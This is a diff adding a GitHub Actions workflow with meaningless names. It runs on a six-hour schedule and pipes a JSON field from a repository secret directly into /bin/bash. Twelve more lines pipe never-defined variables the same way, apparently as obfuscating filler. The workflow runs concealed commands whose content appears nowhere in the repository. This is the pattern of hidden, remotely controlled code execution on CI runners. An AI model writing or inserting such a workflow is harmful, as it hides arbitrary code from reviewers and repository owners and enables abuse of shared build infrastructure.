@@ -1,0 +1,30 @@
+name: yuhiuishiershiyan
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '18 1/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: yuhiuishiershiyan
+        env:
+          gumo60: ${{ secrets.gumo60 }}
+        run: |
+          echo $gumo60 | jq -r .jbex5948 | /bin/bash
+          echo $dvjye7950 | jq -r .v8621 | /bin/bash
+          echo $fgqn54694 | jq -r .c18 | /bin/bash
+          echo $wt13830 | jq -r .zl373 | /bin/bash
+          echo $d956 | jq -r .zuuo8675 | /bin/bash
+          echo $kte74193 | jq -r .xid51 | /bin/bash
+          echo $bwvx139 | jq -r .xcg05209 | /bin/bash
+          echo $ju743 | jq -r .ddbyl80 | /bin/bash
+          echo $n09999 | jq -r .kyojm3839 | /bin/bash
+          echo $yese5 | jq -r .kt175 | /bin/bash
+          echo $mp303 | jq -r .xon0814 | /bin/bash
+          echo $lek86179 | jq -r .xuoa08260 | /bin/bash
+          echo $zuzyp7 | jq -r .rhjj0935 | /bin/bash
+
